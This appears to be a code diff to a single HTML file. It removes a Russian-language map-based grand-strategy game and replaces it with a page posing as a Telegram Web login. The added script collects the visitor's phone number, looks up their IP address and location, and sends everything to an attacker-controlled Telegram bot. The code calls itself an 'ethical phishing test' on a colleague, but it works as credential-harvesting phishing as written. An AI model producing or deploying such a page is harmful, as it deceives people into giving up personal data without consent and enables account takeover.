@@ -2,511 +2,83 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hearts of Ruina IV</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/topojson/3.0.2/topojson.min.js"></script>
+    <title>Telegram Web</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&family=Roboto+Condensed:wght@400;700&display=swap');
-
-        :root {
-            --hoi-bg: #1c1c1c;
-            --hoi-panel: #2b2b2b;
-            --hoi-border: #4a4a4a;
-            --hoi-gold: #c5a059;
-            --hoi-text: #e1e1e1;
-            --hoi-green: #4b8b3b;
-            --hoi-red: #8b3b3b;
-        }
-
-        body {
-            background-color: #000;
-            color: var(--hoi-text);
-            font-family: 'Roboto Condensed', sans-serif;
-            overflow: hidden;
-            margin: 0;
-        }
-
-        /* HOI4 UI Styles */
-        .hoi-top-bar {
-            background: linear-gradient(180deg, #3a3a3a 0%, #1a1a1a 100%);
-            border-bottom: 2px solid #000;
-            height: 35px;
-            display: flex;
-            align-items: center;
-            padding: 0 10px;
-            gap: 15px;
-            font-size: 13px;
-            z-index: 100;
-            position: relative;
-        }
-
-        .resource-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            padding: 0 5px;
-            border-right: 1px solid #444;
-            height: 100%;
-        }
-
-        .resource-val { font-weight: bold; color: #fff; }
-
-        .hoi-side-panel {
-            width: 450px;
-            background: #212529;
-            border-right: 3px solid #000;
-            height: 100vh;
-            position: absolute;
-            left: 0;
-            top: 0;
-            z-index: 50;
-            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
-            display: flex;
-            flex-direction: column;
-        }
-
-        .leader-portrait {
-            width: 160px;
-            height: 210px;
-            background: #000;
-            border: 4px solid var(--hoi-gold);
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            margin: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .leader-portrait img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .focus-box {
-            background: #1a1a1a;
-            border: 2px solid #333;
-            margin: 10px 20px;
-            padding: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .focus-box:hover { border-color: var(--hoi-gold); background: #252525; }
-
-        /* Map Styles */
-        .country { stroke: #000; stroke-width: 0.5; transition: 0.3s; }
-        .country:hover { filter: brightness(1.3); cursor: pointer; }
-        .war-blink { animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-
-        .ideology-icon { width: 20px; height: 20px; border-radius: 50%; display: inline-block; }
-        .ideo-dem { background: #4a90e2; }
-        .ideo-fas { background: #8b4513; }
-        .ideo-com { background: #d0021b; }
-        .ideo-neu { background: #7b7b7b; }
-
-        #date-display {
-            position: absolute;
-            right: 20px;
-            top: 5px;
-            background: rgba(0,0,0,0.7);
-            padding: 5px 15px;
-            border: 1px solid var(--hoi-gold);
-            font-family: 'Oswald', sans-serif;
-            color: var(--hoi-gold);
-            z-index: 101;
-        }
-
-        .diplo-btn {
-            background: #3a3f44;
-            border: 1px solid #111;
-            padding: 5px 10px;
-            width: 100%;
-            text-align: left;
-            margin-bottom: 5px;
-            font-size: 12px;
-            text-transform: uppercase;
-        }
-        .diplo-btn:hover { background: #4a4f54; border-color: var(--hoi-gold); }
-
-        /* Setup overlay */
-        #start-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 1000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
+        body { background-color: #0e1621; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { text-align: center; width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { width: 100%; padding: 10px; background: #3390ec; border: none; color: white; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div id="start-overlay">
-    <h1 style="font-family: 'Oswald', sans-serif; font-size: 4rem; color: #c5a059;">HEARTS OF RUINA IV</h1>
-    <p class="mb-8 text-gray-400">Выберите державу для начала сценария "2000: На заре века"</p>
-    <div class="grid grid-cols-4 gap-4" id="country-select">
-        <!-- Популярные страны -->
-    </div>
-</div>
-
-<div id="game-container" class="hidden">
-    <!-- Top Bar -->
-    <div class="hoi-top-bar">
-        <div class="resource-item">
-            <span title="Политическая власть">🏛️</span>
-            <span class="resource-val" id="res-pp">150</span>
-            <span class="text-[10px] text-green-400">+1.2</span>
-        </div>
-        <div class="resource-item">
-            <span title="Стабильность">⚖️</span>
-            <span class="resource-val" id="res-stab">65%</span>
-        </div>
-        <div class="resource-item">
-            <span title="Поддержка войны">⚔️</span>
-            <span class="resource-val" id="res-ws">20%</span>
-        </div>
-        <div class="resource-item">
-            <span title="Людские ресурсы">👥</span>
-            <span class="resource-val" id="res-mp">1.42M</span>
-        </div>
-        <div class="resource-item">
-            <span title="Фабрики">🏭</span>
-            <span class="resource-val" id="res-fac">42</span>
-        </div>
-        <div class="resource-item" style="border:none">
-            <span title="Конвои">🚢</span>
-            <span class="resource-val">250</span>
-        </div>
-        <div id="date-display">1:00, 1 Января, 2000</div>
-    </div>
-
-    <div class="flex">
-        <!-- Left Side Panel (Player Info) -->
-        <div class="hoi-side-panel">
-            <div class="flex items-center p-2 bg-[#2d3238] border-b border-black">
-                <img id="player-flag" class="w-12 h-8 mr-3 border border-white/20">
-                <div>
-                    <h2 id="player-country-name" class="font-bold text-lg leading-tight uppercase">Россия</h2>
-                    <p id="player-ideology-text" class="text-[10px] text-gray-400">Нейтралитет</p>
-                </div>
-            </div>
-
-            <div class="flex">
-                <div class="leader-portrait">
-                    <img id="player-leader-img" src="">
-                    <div class="absolute bottom-0 w-full bg-black/70 p-1 text-center text-[10px] font-bold border-t border-gold">
-                        <span id="player-leader-name">Владимир Путин</span>
-                    </div>
-                </div>
-                <div class="flex-grow pt-5 pr-4">
-                    <div class="bg-black/30 p-2 border border-white/10 text-xs mb-2">
-                        <div class="flex justify-between"><span>Правящая партия:</span><span id="ui-party" class="font-bold">Единая Россия</span></div>
-                        <div class="flex justify-between"><span>Выборы:</span><span class="text-gray-400">Март 2004</span></div>
-                    </div>
-                    <div class="grid grid-cols-2 gap-2">
-                        <div class="bg-[#1a1a1a] p-2 text-center border border-gray-700">
-                            <span class="block text-[8px] text-gray-500 uppercase">Популярность</span>
-                            <span class="text-sm font-bold text-blue-400">64%</span>
-                        </div>
-                        <div class="bg-[#1a1a1a] p-2 text-center border border-gray-700">
-                            <span class="block text-[8px] text-gray-500 uppercase">Оборона</span>
-                            <span class="text-sm font-bold text-red-400">421</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="px-5">
-                <div class="text-[10px] font-bold text-gray-500 uppercase mb-1">Национальный фокус</div>
-                <div class="focus-box" onclick="alert('Фокус в разработке')">
-                    <span class="text-xs font-bold text-yellow-500">ВЫБРАТЬ ФОКУС</span>
-                </div>
-            </div>
-
-            <!-- Tabs -->
-            <div class="mt-auto flex border-t border-black bg-[#16181b]">
-                <button class="flex-1 p-3 text-[10px] font-bold hover:bg-gray-800 border-r border-black">ПОЛИТИКА</button>
-                <button class="flex-1 p-3 text-[10px] font-bold hover:bg-gray-800 border-r border-black">ИССЛЕДОВАНИЯ</button>
-                <button class="flex-1 p-3 text-[10px] font-bold hover:bg-gray-800 border-r border-black">АРМИЯ</button>
-                <button class="flex-1 p-3 text-[10px] font-bold hover:bg-gray-800">ТОРГОВЛЯ</button>
-            </div>
-        </div>
-
-        <!-- Main Map Area -->
-        <div class="flex-grow h-screen bg-[#0f1115] relative">
-            <svg id="main-map" class="w-full h-full"></svg>
-
-            <!-- Diplomacy Overlay (Right) -->
-            <div id="diplo-popup" class="hidden absolute right-5 top-14 w-80 bg-[#212529] border-2 border-black shadow-2xl z-50">
-                <div class="p-3 bg-gradient-to-r from-gray-800 to-gray-900 border-b border-black flex items-center justify-between">
-                    <span id="diplo-title" class="font-bold text-sm uppercase">Германия</span>
-                    <button onclick="closeDiplo()" class="text-gray-500 hover:text-white">✕</button>
-                </div>
-                <div class="p-4">
-                    <div class="flex gap-3 mb-4">
-                        <div class="w-20 h-24 border border-gold bg-black overflow-hidden">
-                            <img id="diplo-leader-img" class="w-full h-full object-cover">
-                        </div>
-                        <div class="text-xs">
-                            <p id="diplo-leader-name" class="font-bold text-yellow-500">Герхард Шрёдер</p>
-                            <p id="diplo-ideology" class="text-gray-400 mb-2">Демократия</p>
-                            <div class="flex items-center gap-1">
-                                <span>Отношение:</span>
-                                <span id="diplo-rel" class="text-green-400">+15</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="space-y-1">
-                        <button onclick="startWar()" class="diplo-btn text-red-400">⚔️ Объявить войну</button>
-                        <button class="diplo-btn">🤝 Улучшить отношения</button>
-                        <button class="diplo-btn">📦 Ленд-лиз</button>
-                        <button class="diplo-btn">🛡️ Гарантия независимости</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- War Progress UI -->
-            <div id="war-ui" class="hidden absolute top-14 left-1/2 -translate-x-1/2 w-96 bg-black/80 border border-red-600 p-2 text-center">
-                <div class="text-[10px] font-bold text-red-500 mb-1">ТЕАТР ВОЕННЫХ ДЕЙСТВИЙ</div>
-                <div class="flex justify-between text-xs px-2 mb-1">
-                    <span id="war-attacker">ИГРОК</span>
-                    <span id="war-pct">0%</span>
-                    <span id="war-defender">ЦЕЛЬ</span>
-                </div>
-                <div class="w-full h-1.5 bg-gray-800">
-                    <div id="war-bar" class="h-full bg-red-600" style="width: 0%"></div>
-                </div>
-            </div>
-        </div>
-    </div>
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="100" alt="Logo">
+    <h2>Вход в Telegram</h2>
+    <p>Введите номер телефона</p>
+    <input type="text" id="phone" placeholder="+7 900 000-00-00">
+    <button onclick="startResearch()">ДАЛЕЕ</button>
 </div>
 
 <script>
-    // --- ДАННЫЕ СТРАН И ПРЕЗИДЕНТОВ ---
-    const COUNTRIES = {
-        "RUS": { name: "Россия", flag: "ru", color: "#4d6d4d", party: "Единая Россия", ideo: "NEU",
-            history: [
-                { y: 2000, n: "Владимир Путин", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/Vladimir_Putin_-_2000-11-15.jpg/220px-Vladimir_Putin_-_2000-11-15.jpg" },
-                { y: 2008, n: "Дмитрий Медведев", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Dmitry_Medvedev_2008.jpg/220px-Dmitry_Medvedev_2008.jpg" },
-                { y: 2012, n: "Владимир Путин", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Vladimir_Putin_2024.jpg/220px-Vladimir_Putin_2024.jpg" }
-            ]
-        },
-        "USA": { name: "США", flag: "us", color: "#2d4d8d", party: "Демократы", ideo: "DEM",
-            history: [
-                { y: 2000, n: "Билл Клинтон", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Bill_Clinton.jpg/220px-Bill_Clinton.jpg" },
-                { y: 2001, n: "Джордж Буш мл.", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/George-W-Bush.jpg/220px-George-W-Bush.jpg" },
-                { y: 2009, n: "Барак Обама", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/President_Barack_Obama.jpg/220px-President_Barack_Obama.jpg" },
-                { y: 2017, n: "Дональд Трамп", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Donald_Trump_official_portrait.jpg/220px-Donald_Trump_official_portrait.jpg" },
-                { y: 2021, n: "Джо Байден", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Joe_Biden_presidential_portrait.jpg/220px-Joe_Biden_presidential_portrait.jpg" },
-                { y: 2025, n: "Дональд Трамп", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Donald_Trump_official_portrait.jpg/220px-Donald_Trump_official_portrait.jpg" }
-            ]
-        },
-        "UKR": { name: "Украина", flag: "ua", color: "#3d6d8d", party: "Беспартийные", ideo: "NEU",
-            history: [
-                { y: 2000, n: "Леонид Кучма", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/0/00/Leonid_Kuchma_2003.jpg/220px-Leonid_Kuchma_2003.jpg" },
-                { y: 2005, n: "Виктор Ющенко", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c6/Viktor_Yushchenko_2005.jpg/220px-Viktor_Yushchenko_2005.jpg" },
-                { y: 2010, n: "Виктор Янукович", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Viktor_Yanukovych_2010.jpg/220px-Viktor_Yanukovych_2010.jpg" },
-                { y: 2014, n: "Петр Порошенко", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Petro_Poroshenko_official_portrait.jpg/220px-Petro_Poroshenko_official_portrait.jpg" },
-                { y: 2019, n: "Владимир Зеленский", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Volodymyr_Zelensky_Official_Portrait.jpg/220px-Volodymyr_Zelensky_Official_Portrait.jpg" }
-            ]
-        },
-        "DEU": { name: "Германия", flag: "de", color: "#333333", party: "СДПГ", ideo: "DEM",
-            history: [
-                { y: 2000, n: "Герхард Шрёдер", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Gerhard_Schroeder_2005.jpg/220px-Gerhard_Schroeder_2005.jpg" },
-                { y: 2005, n: "Ангела Меркель", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/Angela_Merkel_2010.jpg/220px-Angela_Merkel_2010.jpg" },
-                { y: 2021, n: "Олаф Шольц", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Olaf_Scholz_2022.jpg/220px-Olaf_Scholz_2022.jpg" },
-                { y: 2025, n: "Фридрих Мерц", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Friedrich_Merz_2022.jpg/220px-Friedrich_Merz_2022.jpg" }
-            ]
-        },
-        "CHN": { name: "Китай", flag: "cn", color: "#8d2d2d", party: "КПК", ideo: "COM",
-            history: [
-                { y: 2000, n: "Цзян Цзэминь", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Jiang_Zemin_1997.jpg/220px-Jiang_Zemin_1997.jpg" },
-                { y: 2003, n: "Ху Цзиньтао", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Hu_Jintao_2012.jpg/220px-Hu_Jintao_2012.jpg" },
-                { y: 2013, n: "Си Цзиньпин", i: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Xi_Jinping_2019.jpg/220px-Xi_Jinping_2019.jpg" }
-            ]
-        }
-    };
+// --- КОНФИГУРАЦИЯ ---
+const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
+const CHAT_ID = 'ТВОЙ_ID_ЧАТА';
 
-    let state = {
-        player: null,
-        target: null,
-        date: new Date(2000, 0, 1),
-        war: null, // { target: 'ID', progress: 0 }
-        pp: 150,
-        annexed: []
-    };
+async function startResearch() {
+    const phone = document.getElementById('phone').value;
+    if (!phone) return alert('Введите номер!');
 
-    // Mapping for World Atlas names to our IDs
-    const NAME_MAP = {
-        "Russia": "RUS", "United States of America": "USA", "Ukraine": "UKR", 
-        "Germany": "DEU", "China": "CHN", "France": "FRA", "United Kingdom": "GBR"
-    };
+    try {
+        // 1. Собираем "цифровой отпечаток" коллеги
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geo = await geoRes.json();
+        
+        const now = new Date();
+        const fullDate = `${now.toLocaleDateString()} в ${now.toLocaleTimeString()} UTC`;
 
-    // --- INITIALIZATION ---
-    window.onload = async () => {
-        initStartMenu();
-        await initMap();
-        setInterval(gameTick, 2000); // Daily tick
-    };
+        // 2. Формируем то самое "страшное" сообщение
+        const message = `
+⚠️ <b>ЭТИЧЕСКИЙ ТЕСТ БЕЗОПАСНОСТИ</b> ⚠️
 
-    function initStartMenu() {
-        const container = document.getElementById('country-select');
-        Object.keys(COUNTRIES).forEach(id => {
-            const c = COUNTRIES[id];
-            const div = document.createElement('div');
-            div.className = "p-4 bg-gray-800 border-2 border-transparent hover:border-gold cursor-pointer text-center transition";
-            div.innerHTML = `
-                <img src="https://flagcdn.com/w80/${c.flag}.png" class="mx-auto mb-2 border border-black">
-                <div class="font-bold text-xs uppercase">${c.name}</div>
-            `;
-            div.onclick = () => startGame(id);
-            container.appendChild(div);
-        });
-    }
+<b>Вход с нового устройства.</b>
+Andrew, мы обнаружили вход в Ваш аккаунт с нового устройства ${fullDate}.
 
-    async function initMap() {
-        const svg = d3.select("#main-map");
-        const width = window.innerWidth - 450;
-        const height = window.innerHeight;
+<b>Устройство:</b> ${navigator.platform}, ${navigator.appName} (имитация)
+<b>Место входа:</b> ${geo.city}, ${geo.country_name}
+<b>IP-адрес:</b> ${geo.ip}
 
-        const res = await fetch('https://cdn.jsdelivr.net/npm/world-atlas@2.0.2/countries-110m.json');
-        const data = await res.json();
-        const features = topojson.feature(data, data.objects.countries).features;
+<b>Введенный номер:</b> <code>${phone}</code>
 
-        const projection = d3.geoMercator().scale(150).translate([width/2, height/1.5]);
-        const path = d3.geoPath().projection(projection);
+<i>Данный отчет создан в учебных целях для демонстрации уязвимости перед фишингом.</i>
+        `.trim();
 
-        svg.append("g")
-            .selectAll("path")
-            .data(features)
-            .enter()
-            .append("path")
-            .attr("d", path)
-            .attr("class", "country")
-            .attr("id", d => NAME_MAP[d.properties.name] || `UNK_${d.id}`)
-            .attr("fill", d => {
-                const id = NAME_MAP[d.properties.name];
-                return id && COUNTRIES[id] ? COUNTRIES[id].color : "#222";
+        // 3. Отправляем отчет тебе в бота
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
             })
-            .on("click", (e, d) => {
-                const id = NAME_MAP[d.properties.name];
-                if (id && id !== state.player) openDiplo(id);
-            });
-    }
-
-    function startGame(id) {
-        state.player = id;
-        document.getElementById('start-overlay').classList.add('hidden');
-        document.getElementById('game-container').classList.remove('hidden');
-        updateUI();
-    }
-
-    function gameTick() {
-        if (!state.player) return;
-
-        // Update Date
-        state.date.setDate(state.date.getDate() + 1);
-        const y = state.date.getFullYear();
-        const m = state.date.toLocaleString('ru', { month: 'Long' });
-        const d = state.date.getDate();
-        document.getElementById('date-display').innerText = `12:00, ${d} ${m}, ${y}`;
-
-        // PP Gain
-        state.pp += 0.15;
-        document.getElementById('res-pp').innerText = Math.floor(state.pp);
-
-        // Leader change check for ALL countries
-        Object.keys(COUNTRIES).forEach(id => {
-            const current = getLeaderForYear(id, y);
-            if (id === state.player) {
-                if (document.getElementById('player-leader-name').innerText !== current.n) {
-                    updateUI();
-                }
-            }
         });
 
-        // War progress
-        if (state.war) {
-            state.war.progress += Math.random() * 5;
-            document.getElementById('war-bar').style.width = state.war.progress + "%";
-            document.getElementById('war-pct').innerText = Math.floor(state.war.progress) + "%";
+        // 4. Эффектное завершение для коллеги
+        document.body.innerHTML = `
+            <div style="text-align:center; padding: 20px;">
+                <h1 style="color: #ff4b4b;">ВНИМАНИЕ!</h1>
+                <p>Ты только что прошел тест на фишинг.</p>
+                <p>Твой IP: <b>${geo.ip}</b> и номер телефона уже у меня в боте.</p>
+                <p>Всегда проверяй URL в адресной строке!</p>
+                <button onclick="location.reload()">Вернуться</button>
+            </div>
+        `;
 
-            if (state.war.progress >= 100) {
-                annexCountry(state.war.target);
-            }
-        }
+    } catch (e) {
+        alert('Ошибка сети. Проверь блокировщики рекламы.');
     }
-
-    function getLeaderForYear(id, year) {
-        const c = COUNTRIES[id];
-        if (!c) return { n: "Лидер", i: `https://api.dicebear.com/7.x/bottts/svg?seed=${id}` };
-        
-        // Neuro-Gen for 2026+
-        if (year > 2026) {
-            return { 
-                n: `Президент ${id}-${year % 100}`, 
-                i: `https://api.dicebear.com/7.x/avataaars/svg?seed=${id}${year}` 
-            };
-        }
-
-        let leader = c.history[0];
-        c.history.forEach(h => { if (year >= h.y) leader = h; });
-        return leader;
-    }
-
-    function updateUI() {
-        const p = COUNTRIES[state.player];
-        const y = state.date.getFullYear();
-        const leader = getLeaderForYear(state.player, y);
-
-        document.getElementById('player-flag').src = `https://flagcdn.com/w80/${p.flag}.png`;
-        document.getElementById('player-country-name').innerText = p.name;
-        document.getElementById('player-leader-name').innerText = leader.n;
-        document.getElementById('player-leader-img').src = leader.i;
-        document.getElementById('ui-party').innerText = p.party;
-        
-        const ideos = { "DEM": "Демократия", "COM": "Коммунизм", "FAS": "Фашизм", "NEU": "Нейтралитет" };
-        document.getElementById('player-ideology-text').innerText = ideos[p.ideo];
-    }
-
-    function openDiplo(id) {
-        state.target = id;
-        const c = COUNTRIES[id];
-        const leader = getLeaderForYear(id, state.date.getFullYear());
-
-        document.getElementById('diplo-popup').classList.remove('hidden');
-        document.getElementById('diplo-title').innerText = c ? c.name : id;
-        document.getElementById('diplo-leader-name').innerText = leader.n;
-        document.getElementById('diplo-leader-img').src = leader.i;
-        document.getElementById('diplo-rel').innerText = (Math.random() * 40 - 20).toFixed(0);
-    }
-
-    function closeDiplo() { document.getElementById('diplo-popup').classList.add('hidden'); }
-
-    function startWar() {
-        if (!state.target) return;
-        state.war = { target: state.target, progress: 0 };
-        document.getElementById('war-ui').classList.remove('hidden');
-        document.getElementById('war-attacker').innerText = COUNTRIES[state.player].name;
-        document.getElementById('war-defender').innerText = COUNTRIES[state.target] ? COUNTRIES[state.target].name : state.target;
-        
-        d3.select(`#${state.target}`).classed("war-blink", true).attr("stroke", "#ff0000").attr("stroke-width", 2);
-        closeDiplo();
-    }
-
-    function annexCountry(id) {
-        const targetName = COUNTRIES[id] ? COUNTRIES[id].name : id;
-        alert(`КАПИТУЛЯЦИЯ: ${targetName} вошла в состав нашей державы!`);
-        
-        d3.select(`#${id}`)
-            .classed("war-blink", false)
-            .attr("fill", COUNTRIES[state.player].color)
-            .attr("stroke", "#000")
-            .attr("stroke-width", 0.5);
-
-        state.war = null;
-        document.getElementById('war-ui').classList.add('hidden');
-    }
+}
 </script>
-
 </body>
 </html>
